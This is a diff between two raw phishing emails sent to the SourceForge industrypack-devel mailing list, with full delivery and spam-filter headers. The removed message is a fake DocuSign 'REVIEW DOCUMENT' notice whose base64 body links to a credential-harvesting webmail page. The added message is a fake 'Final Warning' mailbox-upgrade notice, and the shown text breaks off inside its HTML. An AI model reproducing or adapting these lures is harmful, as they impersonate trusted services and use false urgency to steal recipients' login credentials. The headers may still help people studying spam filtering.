@@ -2,102 +2,101 @@ Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
 X-Original-To: lists+industrypack-devel@lfdr.de
 Delivered-To: lists+industrypack-devel@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id DE3869B24BC
-	for <lists+industrypack-devel@lfdr.de>; Mon, 28 Oct 2024 06:56:07 +0100 (CET)
-Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
-	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
+	by mail.lfdr.de (Postfix) with ESMTPS id 6969D9B5A4F
+	for <lists+industrypack-devel@lfdr.de>; Wed, 30 Oct 2024 04:22:49 +0100 (CET)
+Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
+	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
 	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
-	id 1t5IjL-0004ca-4Y
+	id 1t5zIF-0006Hn-Jg
 	for lists+industrypack-devel@lfdr.de;
-	Mon, 28 Oct 2024 05:55:54 +0000
+	Wed, 30 Oct 2024 03:22:47 +0000
 Received: from [172.30.29.66] (helo=mx.sourceforge.net)
- by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
+ by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
- (envelope-from <ec@secureserver.net>) id 1t5IjJ-0004cT-OL
+ (envelope-from <teknis@decoline.ge>) id 1t5zID-0006He-Qq
  for industrypack-devel@lists.sourceforge.net;
- Mon, 28 Oct 2024 05:55:53 +0000
+ Wed, 30 Oct 2024 03:22:45 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
- d=sourceforge.net; s=x; h=Message-ID:Date:Subject:To:From:MIME-Version:
- Content-Type:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
+ d=sourceforge.net; s=x; h=Message-Id:Date:MIME-Version:Content-Type:To:
+ Subject:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
  List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=ZvyMOpFamSoWytXuV9p6uTLheNZbLUhN5+Gl45uYsUw=; b=PP3m36XWOhd+Oh3XkPy1AWpVKm
- k66B4lrCxOZ2lkm57My4IydB/DpIMo091kil25iCNZi/YvQh8FYF83BIH1XXPOEPRFvNL+O32Z/tn
- P4CYoAvQ/waoqw+WZDWzTAvmhBQqD7ssYyAfHUmKTBO/jANJC2eTVlUD8wYObnTT3JeU=;
+ bh=h8wOUv/uGEwB6oztaaGvvfi2S4sUy63a1XtazFCli4g=; b=RvouXDPFAmqzdSxtI/3GsW0LHT
+ ZQOhjEyXDL7QN+9B/vhVTRT8EdM/IR0BFuNr1iQVjmTVpIRI7bWPpOaonee4xnqS7uwzl7ub68qOD
+ v9yuXVBgjC6lt4N+HbCTlBQlCs62EGviVrm4+sBaf8UjdvGmD67rghPS2diYSqWxHj2Q=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
- h=Message-ID:Date:Subject:To:From:MIME-Version:Content-Type:Sender:Reply-To
+ h=Message-Id:Date:MIME-Version:Content-Type:To:Subject:From:Sender:Reply-To
  :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
  Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
  References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
- List-Owner:List-Archive; bh=ZvyMOpFamSoWytXuV9p6uTLheNZbLUhN5+Gl45uYsUw=; b=V
- DPfLKc7U2onQrWlR18lgCcDZG1zduu70zjMOSOcMXjNMYE9rIS5rHku6JvJOPbyI00o25HL7y+bN/
- 6RCGALwqX7aB8/Hz9gi2pvlUXFYopmcpJ3dhBT3pRqzUOxkb4vgILRxFmBaeiCexCMH6ayzvGLMgZ
- kaRs14N0HzqFt86M=;
-Received: from mail-proxy102.phy.heteml.jp ([157.7.189.102])
+ List-Owner:List-Archive; bh=h8wOUv/uGEwB6oztaaGvvfi2S4sUy63a1XtazFCli4g=; b=m
+ JOIRNppYup2zdxuRcACzJwoX+zmAQCwmczja717KcgkmGXdpmCFwsRsc/rQ6IrdUrmKfgD9lPhPNo
+ bHm3VZqz8SwSCAtInwRaGiQV0q3HmT9vBXe/pp04i8qD/2f+VcGk01qHy0gyJJDT5ZbNiG6QaaPFU
+ eI0ObSMba+hQdZOk=;
+Received: from gw16230.fortimail.com ([66.35.16.230])
  by sfi-mx-2.v28.lw.sourceforge.com with esmtps
  (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
- id 1t5IjI-0006MR-6c for industrypack-devel@lists.sourceforge.net;
- Mon, 28 Oct 2024 05:55:53 +0000
-Received: from mail-proxy102.phy.heteml.jp (localhost [127.0.0.1])
- by mail-proxy102.phy.heteml.jp (Postfix) with ESMTP id 107859C015A
+ id 1t5zIC-0002Aq-Sf for industrypack-devel@lists.sourceforge.net;
+ Wed, 30 Oct 2024 03:22:45 +0000
+Received: from mail.baldom.net (mail.baldom.net [190.166.89.137])
+ by gw16230.fortimail.com  with ESMTP id 49U3McIq006418-49U3McIs006418
+ (version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=NO)
+ for <industrypack-devel@lists.sourceforge.net>; Tue, 29 Oct 2024 23:22:39 -0400
+Received: from mail.baldom.net (localhost [127.0.0.1])
+ by mail.baldom.net (Postfix) with ESMTPS id D7D2244C6936
  for <industrypack-devel@lists.sourceforge.net>;
- Mon, 28 Oct 2024 14:55:40 +0900 (JST)
-Received: from 127.0.0.1 (127.0.0.1)
- by mail-proxy102.phy.heteml.jp (HETEML-Fsecure);
- Mon, 28 Oct 2024 14:55:40 +0900 (JST)
-X-Spam-Status: Yes(HETEML-Fsecure) with FSIGK/SPAM_CT/@score=9/BD_CONFIRMED,
- Build: [Engines: 2.18.3.1556, Stamp: 3], Multi: [Enabled, t:
- (0.000007,0.008365)], BW: [Enabled, t: (0.000013,0.000001)], RTDA: [Enabled,
- t: (0.575313), Hit: Yes, Details: v2.80.0; Id: 0.rw7fl.1ib8r3gql.1pbe;
- categories: phishing(ai); url(25d2096f93f39f9a305f62c64e636626:1000);
- ai(10_214fd92e566982fd65f1c5ed6bf7204f-776-m:895)], total: 1000(675)
-X-Virus-Status: clean(HETEML-Fsecure)
-Received: from 6e4d28e.me (unknown [173.239.211.48])
- (Authenticated sender: osaka-minami@mamahata.net)
- by mail-proxy102.phy.heteml.jp (Postfix) with ESMTPA
+ Tue, 29 Oct 2024 18:34:03 -0400 (AST)
+Received: from localhost (localhost [127.0.0.1])
+ by mail.baldom.net (Postfix) with ESMTP id CC69D44C693B
  for <industrypack-devel@lists.sourceforge.net>;
- Mon, 28 Oct 2024 14:55:39 +0900 (JST)
-Content-Type: multipart/mixed; boundary="===============7381838886445254578=="
+ Tue, 29 Oct 2024 18:34:03 -0400 (AST)
+X-Virus-Scanned: amavisd-new at baldom.net
+Received: from mail.baldom.net ([127.0.0.1])
+ by localhost (mail.baldom.net [127.0.0.1]) (amavisd-new, port 10026)
+ with ESMTP id ExMecx__wxDZ
+ for <industrypack-devel@lists.sourceforge.net>;
+ Tue, 29 Oct 2024 18:34:03 -0400 (AST)
+Received: from WIN-BS656MOF35Q (unknown [185.238.231.104])
+ by mail.baldom.net (Postfix) with ESMTPSA id 8B21144C6936
+ for <industrypack-devel@lists.sourceforge.net>;
+ Tue, 29 Oct 2024 18:34:02 -0400 (AST)
+From: "Technical Support" <teknis@decoline.ge>
+To: <industrypack-devel@lists.sourceforge.net>
 MIME-Version: 1.0
-From: DocuSend <ec@secureserver.net>
-To: industrypack-devel@lists.sourceforge.net
-Date: Mon, 28 Oct 2024 05:55:37 -0000
-Message-ID: <173009493753.12100.8117774342842817446@secureserver.net>
-X-WTGWQ: MCNFLLC
-X-LCTOVZST: RMPRHSW
-X-DWCOEWC: QLAORRBZ
-X-WHCRRIN: STIBYLI
-X-VKXBXI: XMBFXHTOP
-X-HPMWSBDRL: TDNFASKBJ
-X-FZPHKBI: ITPRSPUXC
-X-Accept-Language: en-us, en
-X-Priority: 2
-X-MSmail-Priority: High
-Importance: High
+Date: Tue, 29 Oct 2024 15:34:03 -0700
+Message-Id: <29012024103415D119F16EBD-A2C26D74DE@decoline.ge>
+X-FEAS-Client-IP: 190.166.89.137
+X-FE-Last-Public-Client-IP: 190.166.89.137
+X-FE-Policy-ID: 1:3:3:SYSTEM
 X-Spam-Score: 5.9 (+++++)
-X-Spam-Report: Spam detection software,
- running on the system "util-spamd-1.v13.lw.sourceforge.com", 
+X-Spam-Report: Spam detection software, running on the system "util-spamd-2.v13.lw.sourceforge.com",
  has NOT identified this incoming email as spam.  The original
  message has been attached to this so you can view it or label
  similar future email.  If you have any questions, see
  the administrator of that system for details.
- Content preview:  &nbsp;
- You have a new document to be completed. REVIEW DOCUMENT
+ 
+ Content preview:  Dear  industrypack-devel@lists.sourceforge.net, You have 5
+    New pending mails. Your mail version 2.0.1 is currently being discontinued
+    from receiving incoming mails, and will no longer work as of 10/29 [...] 
+ 
  Content analysis details:   (5.9 points, 6.0 required)
- pts rule name              description
+ 
+  pts rule name              description
  ---- ---------------------- --------------------------------------------------
- 5.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
- [157.7.189.102 listed in dnsbl-1.uceprotect.net]
- 0.9 SPF_FAIL               SPF: sender does not match SPF record (fail)
- [SPF failed: Rejected by SPF record]
- 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
- 0.0 HTML_MESSAGE           BODY: HTML included in message
-X-Headers-End: 1t5IjI-0006MR-6c
-Subject: [Industrypack-devel] [Action Required]:You have received a new
- shared DOC to be Completed On_Sunday October 2024 - [Ref #
- CSS-27F11-S19-L546H]
+  2.5 URIBL_DBL_PHISH        Contains a Phishing URL listed in the Spamhaus
+                             DBL blocklist
+                             [URIs: oortech.com]
+  2.5 URIBL_DBL_MALWARE      Contains a malware URL listed in the Spamhaus
+                             DBL blocklist
+                             [URIs: oortech.com]
+  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
+  1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
+  0.0 HTML_MESSAGE           BODY: HTML included in message
+X-Headers-End: 1t5zIC-0002Aq-Sf
+Subject: [Industrypack-devel] Final Warning
+ industrypack-devel@lists.sourceforge.net
 X-BeenThere: industrypack-devel@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -109,149 +108,304 @@ List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
 List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
  <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
+Content-Type: multipart/mixed; boundary="===============0792123753160614522=="
 Errors-To: industrypack-devel-bounces@lists.sourceforge.net
 
---===============7381838886445254578==
-Content-Type: multipart/alternative;
- boundary="===============4067046544978898501=="
-MIME-Version: 1.0
+This is a multi-part message in MIME format
 
---===============4067046544978898501==
-Content-Type: text/plain; charset="utf-8"
-MIME-Version: 1.0
-Content-Transfer-Encoding: base64
+--===============0792123753160614522==
+Content-Type: multipart/alternative; boundary="GUHXNQerZ2YSBzH3oSb=_OTL34oM8hnXJ8"
 
-CgoKCgoKJm5ic3A7CgoKCgoKCgoKCgoKCgoKCllvdSBoYXZlIGEgbmV3IGRvY3VtZW50IHRvIGJl
-IGNvbXBsZXRlZC4KCgoKCgoKCgoKCgpSRVZJRVcgRE9DVU1FTlQgCgoKCgoKCgoKCgoKCgoKCgpZ
-b3VyIGRvY3VtZW50IGhhcyBiZWVuIGNvbXBsZXRlZEtpbmQgcmVnYXJkc0luZHVzdHJ5cGFjayBE
-ZXZlbFRoYW5rIHlvdSwKCgoKCgoKCgpQb3dlcmVkIGJ5Jm5ic3A7CgoKCgoKCgoKCkRvIE5vdCBT
-aGFyZSBUaGlzIEVtYWlsVGhpcyBlbWFpbCBjb250YWlucyBhIHNlY3VyZSBsaW5rIHRvIERvY3VT
-aWduLiBQbGVhc2UgZG8gbm90IHNoYXJlIHRoaXMgZW1haWwsIGxpbmssIG9yIGFjY2VzcyBjb2Rl
-IHdpdGggb3RoZXJzLgpBYm91dCBEb2N1U2lnblNpZ24gZG9jdW1lbnRzIGVsZWN0cm9uaWNhbGx5
-IGluIGp1c3QgbWludXRlcy4gSXQncyBzYWZlLCBzZWN1cmUsIGFuZCBsZWdhbGx5IGJpbmRpbmcu
-IFdoZXRoZXIgeW91J3JlIGluIGFuIG9mZmljZSwgYXQgaG9tZSwgb24tdGhlLWdvIC0tIG9yIGV2
-ZW4gYWNyb3NzIHRoZSBnbG9iZSAtLSBEb2N1U2lnbiBwcm92aWRlcyBhIHByb2Zlc3Npb25hbCB0
-cnVzdGVkIHNvbHV0aW9uIGZvciBEaWdpdGFsIFRyYW5zYWN0aW9uIE1hbmFnZW1lbnQmdHJhZGU7
-LgpRdWVzdGlvbnMgYWJvdXQgdGhlIERvY3VtZW50P0lmIHlvdSBuZWVkIHRvIG1vZGlmeSB0aGUg
-ZG9jdW1lbnQgb3IgaGF2ZSBxdWVzdGlvbnMgYWJvdXQgdGhlIGRldGFpbHMgaW4gdGhlIGRvY3Vt
-ZW50LCBwbGVhc2UgcmVhY2ggb3V0IHRvIHRoZSBzZW5kZXIgYnkgZW1haWxpbmcgdGhlbSBkaXJl
-Y3RseS4KVGhpcyBtZXNzYWdlIHdhcyBzZW50IHRvJm5ic3A7IEluZHVzdHJ5cGFjayBEZXZlbCB3
-aG8gaXMgdXNpbmcgdGhlIERvY3VTaWduIEVsZWN0cm9uaWMgU2lnbmF0dXJlIFNlcnZpY2UuIElm
-IHlvdSB3b3VsZCByYXRoZXIgbm90IHJlY2VpdmUgZW1haWwgZnJvbSB0aGlzIHNlbmRlciB5b3Ug
-bWF5IGNvbnRhY3QgdGhlIHNlbmRlciB3aXRoIHlvdXIgcmVxdWVzdC4KCgoKCgombmJzcDsKCgoK
-Cgo=
+This is a multi-part message in MIME format
 
---===============4067046544978898501==
-Content-Type: multipart/related;
- boundary="===============6682154439436969034=="
-MIME-Version: 1.0
+--GUHXNQerZ2YSBzH3oSb=_OTL34oM8hnXJ8
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
---===============6682154439436969034==
-Content-Type: text/html; charset="utf-8"
-MIME-Version: 1.0
-Content-Transfer-Encoding: base64
 
-PGRpdj4KPGRpdiBjbGFzcz0icnBzXzRhOWMiPgo8ZGl2IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9y
-OiAjZWFlYWVhOyBwYWRkaW5nOiAyJTsgZm9udC1mYW1pbHk6IEhlbHZldGljYSwgQXJpYWwsICdT
-YW5zIFNlcmlmJywgc2VyaWYsIEVtb2ppRm9udDsiPgo8dGFibGUgZGlyPSIiIGJvcmRlcj0iMCIg
-d2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMCIgYWxpZ249ImNlbnRl
-ciI+Cjx0Ym9keT4KPHRyPgo8dGQ+Jm5ic3A7PC90ZD4KPHRkIHdpZHRoPSI2NDAiPgo8dGFibGUg
-c3R5bGU9ImJvcmRlci1jb2xsYXBzZTogY29sbGFwc2U7IGJhY2tncm91bmQtY29sb3I6ICNmZmZm
-ZmY7IG1heC13aWR0aDogNjQwcHg7Ij4KPHRib2R5Pgo8dHI+Cjx0ZCBzdHlsZT0icGFkZGluZzog
-MTBweCAyNHB4OyI+PGltZyBzcmM9Imh0dHBzOi8vbG9nb2RpeC5jb20vbG9nby85MjU4NDQucG5n
-IiBhbHQ9IiIgLz48L3RkPgo8L3RyPgo8dHI+Cjx0ZCBzdHlsZT0icGFkZGluZzogMHB4IDI0cHgg
-MzBweCAyNHB4OyI+Cjx0YWJsZSBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjogIzAwNDE2NTsgY29s
-b3I6ICNmZmZmZmY7IiBib3JkZXI9IjAiIHdpZHRoPSIxMDAlIiBjZWxsc3BhY2luZz0iMCIgY2Vs
-bHBhZGRpbmc9IjAiIGFsaWduPSJjZW50ZXIiPgo8dGJvZHk+Cjx0cj4KPHRkIHN0eWxlPSJwYWRk
-aW5nOiAyOHB4IDM2cHggMzZweCAzNnB4OyBib3JkZXItcmFkaXVzOiAycHg7IGJhY2tncm91bmQt
-Y29sb3I6ICMwMDQxNjU7IGNvbG9yOiAjZmZmZmZmOyBmb250LXNpemU6IDE2cHg7IGZvbnQtZmFt
-aWx5OiBIZWx2ZXRpY2EsQXJpYWwsU2FucyBTZXJpZjsgd2lkdGg6IDEwMCU7IHRleHQtYWxpZ246
-IGNlbnRlcjsiIGFsaWduPSJjZW50ZXIiPjxpbWcgc3R5bGU9IndpZHRoOiA3NXB4OyBoZWlnaHQ6
-IDc1cHg7IiBzcmM9Imh0dHBzOi8vTkEzLmRvY3VzaWduLm5ldC9tZW1iZXIvSW1hZ2VzL2VtYWls
-L2RvY0ludml0ZS13aGl0ZS5wbmciIGFsdD0iIiB3aWR0aD0iNzUiIGhlaWdodD0iNzUiIGRhdGEt
-aW1hZ2V0eXBlPSJFeHRlcm5hbCIgLz4KPHRhYmxlIGJvcmRlcj0iMCIgd2lkdGg9IjEwMCUiIGNl
-bGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMCI+Cjx0Ym9keT4KPHRyIHN0eWxlPSJoZWlnaHQ6
-IDE4LjU0NjlweDsiPgo8dGQgc3R5bGU9InBhZGRpbmctdG9wOiAyNHB4OyBmb250LXNpemU6IDE2
-cHg7IGZvbnQtZmFtaWx5OiBIZWx2ZXRpY2EsIEFyaWFsLCAnU2FucyBTZXJpZic7IGJvcmRlcjog
-bm9uZTsgdGV4dC1hbGlnbjogY2VudGVyOyBjb2xvcjogI2ZmZmZmZjsgaGVpZ2h0OiAxOC41NDY5
-cHg7IiBhbGlnbj0iY2VudGVyIj5Zb3UgaGF2ZSBhIG5ldyBkb2N1bWVudCB0byBiZSBjb21wbGV0
-ZWQuPC90ZD4KPC90cj4KPC90Ym9keT4KPC90YWJsZT4KPHRhYmxlIGJvcmRlcj0iMCIgd2lkdGg9
-IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMCI+Cjx0Ym9keT4KPHRyPgo8dGQg
-c3R5bGU9InBhZGRpbmctdG9wOiAzMHB4OyIgYWxpZ249ImNlbnRlciI+CjxkaXY+Cjx0YWJsZSBj
-ZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjAiPgo8dGJvZHk+Cjx0ciBzdHlsZT0iaGVpZ2h0
-OiA0NC4wOTM4cHg7Ij4KPHRkIHN0eWxlPSJmb250LXNpemU6IDE1cHg7IGNvbG9yOiAjMDAwMDAw
-OyBiYWNrZ3JvdW5kLWNvbG9yOiAjYjE5NDAxOyBmb250LWZhbWlseTogSGVsdmV0aWNhLCBBcmlh
-bCwgJ1NhbnMgU2VyaWYnOyBmb250LXdlaWdodDogYm9sZDsgdGV4dC1hbGlnbjogY2VudGVyOyB0
-ZXh0LWRlY29yYXRpb246IG5vbmU7IGJvcmRlci1yYWRpdXM6IDJweDsgZGlzcGxheTogYmxvY2s7
-IGhlaWdodDogNDQuMDkzOHB4OyIgYWxpZ249ImNlbnRlciI+PGEgc3R5bGU9ImZvbnQtc2l6ZTog
-MTVweDsgY29sb3I6ICMwMDAwMDA7IGJhY2tncm91bmQtY29sb3I6ICNiMTk0MDE7IGZvbnQtZmFt
-aWx5OiBIZWx2ZXRpY2EsQXJpYWwsU2FucyBTZXJpZjsgZm9udC13ZWlnaHQ6IGJvbGQ7IHRleHQt
-YWxpZ246IGNlbnRlcjsgdGV4dC1kZWNvcmF0aW9uOiBub25lOyBib3JkZXItcmFkaXVzOiAycHg7
-IGRpc3BsYXk6IGlubGluZS1ibG9jazsiIGhyZWY9Imh0dHBzOi8vZnhhdXRvcy5jb20vZGVsbG9z
-aGkvV0VCTUFJTC1pbmRleC5odG1sI2luZHVzdHJ5cGFjay1kZXZlbEBsaXN0cy5zb3VyY2Vmb3Jn
-ZS5uZXQiIHRhcmdldD0iX2JsYW5rIiByZWw9Im5vb3BlbmVyIG5vcmVmZXJyZXIiIGRhdGEtYXV0
-aD0iTm90QXBwbGljYWJsZSIgZGF0YS1saW5raW5kZXg9IjAiPjxzcGFuIHN0eWxlPSJwYWRkaW5n
-OiAwcHggMjRweDsgbGluZS1oZWlnaHQ6IDQ0cHg7Ij5SRVZJRVcgRE9DVU1FTlQgPC9zcGFuPjwv
-YT48L3RkPgo8L3RyPgo8L3Rib2R5Pgo8L3RhYmxlPgo8L2Rpdj4KPC90ZD4KPC90cj4KPC90Ym9k
-eT4KPC90YWJsZT4KPC90ZD4KPC90cj4KPC90Ym9keT4KPC90YWJsZT4KPC90ZD4KPC90cj4KPHRy
-Pgo8dGQgc3R5bGU9InBhZGRpbmc6IDBweCAyNHB4IDI0cHggMjRweDsgY29sb3I6ICMwMDAwMDA7
-IGZvbnQtc2l6ZTogMTZweDsgZm9udC1mYW1pbHk6IEhlbHZldGljYSxBcmlhbCxTYW5zIFNlcmlm
-OyBiYWNrZ3JvdW5kLWNvbG9yOiB3aGl0ZTsiPgo8cD5Zb3VyIGRvY3VtZW50IGhhcyBiZWVuIGNv
-bXBsZXRlZDxiciAvPjxiciAvPktpbmQgcmVnYXJkczxiciAvPjxzdHJvbmc+SW5kdXN0cnlwYWNr
-IERldmVsPGJyIC8+PGJyIC8+PC9zdHJvbmc+VGhhbmsgeW91LDwvcD4KPC90ZD4KPC90cj4KPHRy
-Pgo8dGQgc3R5bGU9InBhZGRpbmc6IDBweCAyNHB4IDEycHggMjRweDsgYmFja2dyb3VuZC1jb2xv
-cjogI2ZmZmZmZjsgZm9udC1mYW1pbHk6IEhlbHZldGljYSxBcmlhbCxTYW5zIFNlcmlmOyBmb250
-LXNpemU6IDExcHg7IGNvbG9yOiAjNjY2NjY2OyI+Cjx0YWJsZSBib3JkZXI9IjAiIGNlbGxzcGFj
-aW5nPSIwIiBjZWxscGFkZGluZz0iMCI+Cjx0Ym9keT4KPHRyPgo8dGQgc3R5bGU9ImZvbnQtZmFt
-aWx5OiBIZWx2ZXRpY2EsQXJpYWwsU2FucyBTZXJpZjsgZm9udC1zaXplOiAxMXB4OyBjb2xvcjog
-IzY2NjY2NjsgdmVydGljYWwtYWxpZ246IHRvcDsiIHZhbGlnbj0idG9wIj4KPGRpdiBzdHlsZT0i
-Zm9udC1mYW1pbHk6IEhlbHZldGljYSwgQXJpYWwsICdTYW5zIFNlcmlmJywgc2VyaWYsIEVtb2pp
-Rm9udDsgZm9udC1zaXplOiAxMXB4OyBjb2xvcjogIzY2NjY2NjsgcGFkZGluZzogMnB4IDVweCAw
-cHggMHB4OyI+UG93ZXJlZCBieSZuYnNwOzwvZGl2Pgo8L3RkPgo8dGQ+PGltZyBzdHlsZT0iYm9y
-ZGVyOiBub25lOyIgc3JjPSJodHRwczovL05BMy5kb2N1c2lnbi5uZXQvU2lnbmluZy9JbWFnZXMv
-ZW1haWwvRW1haWxfUG93ZXJCeUxvZ28ucG5nIiBhbHQ9IkRvY3VTaWduIiBoZWlnaHQ9IjE5IiBk
-YXRhLWltYWdldHlwZT0iRXh0ZXJuYWwiIC8+PC90ZD4KPC90cj4KPC90Ym9keT4KPC90YWJsZT4K
-PC90ZD4KPC90cj4KPHRyPgo8dGQgc3R5bGU9InBhZGRpbmc6IDMwcHggMjRweCA0NXB4IDI0cHg7
-IGJhY2tncm91bmQtY29sb3I6ICNlYWVhZWE7Ij4KPHAgc3R5bGU9Im1hcmdpbi1ib3R0b206IDFl
-bTsgZm9udC1mYW1pbHk6IEhlbHZldGljYSxBcmlhbCxTYW5zIFNlcmlmOyBmb250LXNpemU6IDEz
-cHg7IGNvbG9yOiAjNjY2NjY2OyBsaW5lLWhlaWdodDogMThweDsiPjxzdHJvbmc+RG8gTm90IFNo
-YXJlIFRoaXMgRW1haWw8L3N0cm9uZz48YnIgLz5UaGlzIGVtYWlsIGNvbnRhaW5zIGEgc2VjdXJl
-IGxpbmsgdG8gRG9jdVNpZ24uIFBsZWFzZSBkbyBub3Qgc2hhcmUgdGhpcyBlbWFpbCwgbGluaywg
-b3IgYWNjZXNzIGNvZGUgd2l0aCBvdGhlcnMuPC9wPgo8cCBzdHlsZT0ibWFyZ2luLWJvdHRvbTog
-MWVtOyBmb250LWZhbWlseTogSGVsdmV0aWNhLEFyaWFsLFNhbnMgU2VyaWY7IGZvbnQtc2l6ZTog
-MTNweDsgY29sb3I6ICM2NjY2NjY7IGxpbmUtaGVpZ2h0OiAxOHB4OyI+PHN0cm9uZz5BYm91dCBE
-b2N1U2lnbjwvc3Ryb25nPjxiciAvPlNpZ24gZG9jdW1lbnRzIGVsZWN0cm9uaWNhbGx5IGluIGp1
-c3QgbWludXRlcy4gSXQncyBzYWZlLCBzZWN1cmUsIGFuZCBsZWdhbGx5IGJpbmRpbmcuIFdoZXRo
-ZXIgeW91J3JlIGluIGFuIG9mZmljZSwgYXQgaG9tZSwgb24tdGhlLWdvIC0tIG9yIGV2ZW4gYWNy
-b3NzIHRoZSBnbG9iZSAtLSBEb2N1U2lnbiBwcm92aWRlcyBhIHByb2Zlc3Npb25hbCB0cnVzdGVk
-IHNvbHV0aW9uIGZvciBEaWdpdGFsIFRyYW5zYWN0aW9uIE1hbmFnZW1lbnQmdHJhZGU7LjwvcD4K
-PHAgc3R5bGU9Im1hcmdpbi1ib3R0b206IDFlbTsgZm9udC1mYW1pbHk6IEhlbHZldGljYSxBcmlh
-bCxTYW5zIFNlcmlmOyBmb250LXNpemU6IDEzcHg7IGNvbG9yOiAjNjY2NjY2OyBsaW5lLWhlaWdo
-dDogMThweDsiPjxzdHJvbmc+UXVlc3Rpb25zIGFib3V0IHRoZSBEb2N1bWVudD88L3N0cm9uZz48
-YnIgLz5JZiB5b3UgbmVlZCB0byBtb2RpZnkgdGhlIGRvY3VtZW50IG9yIGhhdmUgcXVlc3Rpb25z
-IGFib3V0IHRoZSBkZXRhaWxzIGluIHRoZSBkb2N1bWVudCwgcGxlYXNlIHJlYWNoIG91dCB0byB0
-aGUgc2VuZGVyIGJ5IGVtYWlsaW5nIHRoZW0gZGlyZWN0bHkuPGJyIC8+PGJyIC8+PGJyIC8+PC9w
-Pgo8cCBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMWVtOyBmb250LWZhbWlseTogSGVsdmV0aWNhLEFy
-aWFsLFNhbnMgU2VyaWY7IGZvbnQtc2l6ZTogMTBweDsgY29sb3I6ICM2NjY2NjY7IGxpbmUtaGVp
-Z2h0OiAxNHB4OyI+VGhpcyBtZXNzYWdlIHdhcyBzZW50IHRvJm5ic3A7IEluZHVzdHJ5cGFjayBE
-ZXZlbCB3aG8gaXMgdXNpbmcgdGhlIERvY3VTaWduIEVsZWN0cm9uaWMgU2lnbmF0dXJlIFNlcnZp
-Y2UuIElmIHlvdSB3b3VsZCByYXRoZXIgbm90IHJlY2VpdmUgZW1haWwgZnJvbSB0aGlzIHNlbmRl
-ciB5b3UgbWF5IGNvbnRhY3QgdGhlIHNlbmRlciB3aXRoIHlvdXIgcmVxdWVzdC48L3A+CjwvdGQ+
-CjwvdHI+CjwvdGJvZHk+CjwvdGFibGU+CjwvdGQ+Cjx0ZD4mbmJzcDs8L3RkPgo8L3RyPgo8L3Ri
-b2R5Pgo8L3RhYmxlPgo8L2Rpdj4KPC9kaXY+CjwvZGl2Pg==
+Dear=A0 industrypack-devel@lists.sourceforge.net,
+You have 5 New pending mails. Your mail version 2.0.1 is currently bei=
+ng discontinued from receiving incoming mails, and will no longer work=
+ as of 10/29/2024.
 
---===============6682154439436969034==--
+=A0
 
---===============4067046544978898501==--
+To retrieve your messages and upgrade to version 3.0.1, kindly follow =
+the upgrade information below:=A0
 
---===============7381838886445254578==
+
+Upgrade to version 3.0.1 now
+=A0
+
+Email Service Team.
+
+
+industrypack-devel@lists.sourceforge.net =A02024.
+
+--GUHXNQerZ2YSBzH3oSb=_OTL34oM8hnXJ8
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+ <html><body><P><BR class=3Dv1Apple-interchange-newline></p><p><table =
+id=3Dv1gmail-ydpa8fd0474yiv1900260976ydpa3753d67m_-2041617411434756832=
+m_4949633165068077493m_-5396927788566179137m_8764997356839036012m_-666=
+8086669148576920m_8264483903862251771m_-3599110451679289427m_-39489850=
+65995513821gmail-yiv9744637941yui_3_16_0_1_1517936570293_5300 class=3D=
+v1gmail-ydpa8fd0474yiv1900260976ydpa3753d67m_-2041617411434756832m_494=
+9633165068077493m_-5396927788566179137m_8764997356839036012m_-66680866=
+69148576920m_8264483903862251771m_-3599110451679289427m_-3948985065995=
+513821gmail-yiv9744637941yahoo-compose-table-card style=3D"FONT-SIZE: =
+15px; FONT-FAMILY: Calibri, Helvetica, sans-serif, serif, EmojiFont; W=
+HITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIG=
